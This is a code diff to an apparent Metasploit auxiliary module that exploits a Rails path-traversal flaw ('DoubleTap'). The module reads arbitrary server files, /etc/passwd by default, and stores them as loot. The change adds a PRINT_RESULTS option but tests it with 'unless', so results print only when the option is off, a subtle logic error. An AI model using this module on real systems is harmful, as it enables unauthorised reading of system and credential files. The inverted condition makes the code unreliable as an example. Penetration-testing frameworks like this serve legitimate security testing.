@@ -39,7 +39,8 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(80),
         OptString.new('ROUTE', [true, 'A route on the vulnerable server.', '/home']),
         OptInt.new('DEPTH', [true, 'The depth of the traversal.', 10]),
-        OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd'])
+        OptString.new('TARGET_FILE', [true, 'The absolute path of remote file to read.', '/etc/passwd']),
+        OptBool.new('PRINT_RESULTS', [true, 'Print results of module (may hang with large amounts of data).', true])
       ]
     )
 
@@ -112,8 +113,12 @@ class MetasploitModule < Msf::Auxiliary
       print_error 'User probably doesnt have access to the requested file.' if res.code == 500
       return
     end
-    print_good 'Response from server:'
-    print_line res.body.to_s
+
+    unless datastore['PRINT_RESULTS']
+      print_good 'Response from server:'
+      print_line res.body.to_s
+    end
     store_loot('rails.doubletap.file', 'text/plain', datastore['RHOSTS'], res.body.to_s, datastore['TARGET_FILE'], "File read via Rails DoubleTap auxiliary module.")
+    print_status 'Results stored as loot.'
   end
 end
